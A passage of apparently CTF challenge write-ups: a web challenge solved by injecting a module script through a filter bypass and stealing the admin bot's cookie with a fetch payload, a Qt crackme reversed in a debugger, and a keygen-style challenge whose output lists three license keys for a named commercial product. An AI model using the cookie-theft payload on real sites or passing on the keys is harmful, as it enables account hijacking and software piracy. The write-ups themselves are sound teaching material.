  return extension.toLowerCase() !== '.js';
}
```

We can bypass this using other extensions for javascript such .cjs or .mjs. We then look at the report functionality:

```js
app.post('/report', async (req, res) => {
  const url = req.body.url;
  if (!url) {
    return res.status(400).send('url is required');
  }
  await visitPageWithCookie(url);
    res.send('If the url is valid admin visisted it, otherwise good luck :3');
});
```
It calls visitPageWithCookie() which just launches puppeteer and visits the page provided in the body of the request. We can use this to make it load our js file uploaded through the /func/upload endpoint.

The /custom endpoint returns a page that loads a script given by the user, which is perfect for us. 

```js
app.get('/custom', (req, res) => {
  let text = req.query.text;
  if (text) {
    // Sanitize the text input to ensure it's safe to use in the output
    text = sanitizeHtml(text, {
      allowedTags: [],
      allowedAttributes: {} // Do not allow any HTML attributes / tags
    });


    // Use the sanitized text
    res.send(`You entered: ${text}
      <script src="http://localhost:8080${text}"></script>
    `);
  } else {
    res.send('Please provide the name of the js in the query parameter. For example, ?text=hello_rocsc2024.js');
  }
});
```

All we have to do is:
- Upload mjs or cjs file
- Request /report with url body param set to localhost:8080/custom?text=/public/uploads/local-myjs.mjs” type=”module” (this is needed to use mjs instead of js)
- Pupeteer will then load and execute our script.
- Now how do we retrieve the cookie? For that we can use our js file to take the cookie stored by puppeteer and POST it to /func/uploads where we can access it.


Our payload file:
```js
let formData = new FormData();
formData.append('file', new Blob([JSON.stringify(document.cookie)],
    { type: 'text/plain' }),
    'myfile'
    );


fetch('/func/upload', {
    method: 'POST',
    body: formData
});
```

Which we upload using the webpage

![673e2623-daf4-4c0c-a164-b1f9ad6c1d2a](https://github.com/vektor8/CTF-Writeups/assets/56222237/efcb3e9e-097c-4852-8723-3fb16f211c2c)

We use thunderclient to send the POST request to the /report endpoint

![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/373deb83-628e-44bf-b010-7270467cfaa9)

![53ba7673-629e-4d43-994e-0d85137860e1](https://github.com/vektor8/CTF-Writeups/assets/56222237/2389d95d-460b-4613-8883-dba310dd05cb)

And there it downloads and we got it.

## ui-crack
### Flag proof
```CTF{165cd3a1c5f03af866353834a5e256170d8f345fbd06c2c6cb43565d1edec5f2}```

### Summary
Reverse engineer the Qt application using the debugger and ida

### Details
We start by finding the function processing our input: 

![cb979595-0545-4ea0-bd32-fe0f751be005](https://github.com/vektor8/CTF-Writeups/assets/56222237/82e73fbb-b034-4684-a208-5c6c3d02ada1)

First it gets our input and splits by _ and expects it to split into 5 parts otherwise it outputs Meh and exits.

Then it checks the System Language and and if it is US it exits with the message: `Ai gresit tara!` After the system language it checks for the first part of the string to be RO. So we have the first of 5 parts.

![99e4d3dc-1c7d-43b9-b79a-7fda235e777b](https://github.com/vektor8/CTF-Writeups/assets/56222237/1a03bcde-cbda-492c-821e-b25de888354d)

We set our system to Romanian and open x32 debugger and see what else it expects.

![5b83c067-9ce7-4dee-b07b-ebf02387e261](https://github.com/vektor8/CTF-Writeups/assets/56222237/83ac552f-38ce-4be7-aac1-056fd8451b0a)

Now we break at the Language comparison part and we find the following

![f52388e9-968f-4106-8d75-7b7c0c2ed691](https://github.com/vektor8/CTF-Writeups/assets/56222237/bc29149b-783c-470d-a768-301a7c554f6b)

We see that QstringCompare is called and in the params we see two stack addresses corresponding to `RO` and `US` which before I changed my system language would always be `US` and `US` leading to failure.

Then for the second part of the input so after the first underscore, we have three comparisons. 

![4409c8af-9325-475c-b607-1f1adf2d4827](https://github.com/vektor8/CTF-Writeups/assets/56222237/20c7e461-78ee-444b-8d8c-31fb4c7a5c4f)

Here is the first comparison, it fetched the first char from the second part of our input and compared it with something resulting in 12h in EAX (return value). Knowing that we can see that it compared `1` (the first char from the second part of our input) with something resulting in 18.  So `C` is the right answer here, because it is 18 away from `1` in ascii. In the same way we find the other two chars to be T and F.
So we have until now.
`RO_CTF_?_?_?`


For the middle part we can see easily in IDA.

![24fc980a-7753-4d89-8721-a3bc750a7dcb](https://github.com/vektor8/CTF-Writeups/assets/56222237/b44c7d40-9dee-42cc-bd61-cab922241888)

It expects the year, therefore we have
`RO_CTF_2024_?_?`

For the fourth part we have the following

![51145c13-b727-4a7e-be86-6a3cd1c2d91a](https://github.com/vektor8/CTF-Writeups/assets/56222237/c5d36337-2d6f-4344-8290-1f61b0dbfea9)


It expects uppercase of the Hackers string defined above, so we have
`RO_CTF_2024_HACKERS_?`

For the last part compare is called with `WINDOWS` as the second param

![03db3601-d007-473c-a884-b338dc7cb271](https://github.com/vektor8/CTF-Writeups/assets/56222237/7e5dc324-8311-4e81-a33c-589946af9439)

So we have `RO_CTF_2024_HACKERS_WINDOWS` which is validated and we compute the sha256 of this string and we got it.

## crackinator

### Flag proof
```
Flag proof
Q1. What is ProUnlimited Passfab key? D66D83-7A8B61-20F07F-F78A5A-7ADD1569
Q2. What is ProFamily Passfab key? : D66D83-6C8F7E-3AF368-CCAF50-63EC367B
Q3. What is ProPersonal Passfab key? : D66D83-7F807F-3AF278-E28364-69C41558
```
### Summary
Use the debugger to see what strings it expects.

### Details
We install and open the main executable from the installed folder in IDA where we find an interesting function
![243d9089-8c5d-49b4-96dc-462ba347850d](https://github.com/vektor8/CTF-Writeups/assets/56222237/b8a8ca11-b9b5-431f-8da4-e1e81efa4407)
Here the user input is processed and the three types of key are checked until one is good or all fail.
Let’s open the executable in the x32 debugger and set a breakpoint to this function.

First we open it and find it’s image base

![3ecbd27d-5f84-4b15-a999-c08cf0e060f4](https://github.com/vektor8/CTF-Writeups/assets/56222237/9ce8fd20-3fad-4572-8196-10fa067bb4c6)

Then we use this image base to rebase the executable in IDA.
Now rebased we know that this functions is at 0xCC4520 so we breakpoint there

![06ae8b4a-7141-41e0-85f2-84f1eefc8ef3](https://github.com/vektor8/CTF-Writeups/assets/56222237/d26c4e93-b3b1-4692-9d14-93122060d6a8)

![f1bfb555-3ddf-430d-9f8e-7254b634653e](https://github.com/vektor8/CTF-Writeups/assets/56222237/386f85d1-64fb-4bf2-92e1-4aab60b4681a)

There we can even see our inputs on the stack. So we were right, here something happens with our input.

We go in IDA now inside the CHECK function as we called it and look inside. We find a strcmp influencing the return value. This must be the actual check for validity, so we set a breakpoint there. 

![2ccd781f-2ef2-4a79-9fc0-3f1354d74fd6](https://github.com/vektor8/CTF-Writeups/assets/56222237/40320082-eb83-47b1-8205-9a39bd464cc5)

Now at that breakpoint we can see it comparing our input with an actual key. This is only the first however, of the three. Coming back to this breakpoint as the check keeps failing due to our invalid keys reveals all the keys one by one.

![2713f915-5c80-4219-b279-5e3740a3279a](https://github.com/vektor8/CTF-Writeups/assets/56222237/b156b369-d85f-4045-863c-47784ac63a40)

![68a6d04c-0a35-4a7d-8de1-242450acbf59](https://github.com/vektor8/CTF-Writeups/assets/56222237/fc243750-aedd-4108-8fa6-59889d4969c6)

![353cce5d-2e54-46ff-879e-f016ad44d622](https://github.com/vektor8/CTF-Writeups/assets/56222237/715cfaec-b8cd-4a08-b022-4471568856c1)

And done with all three flags.
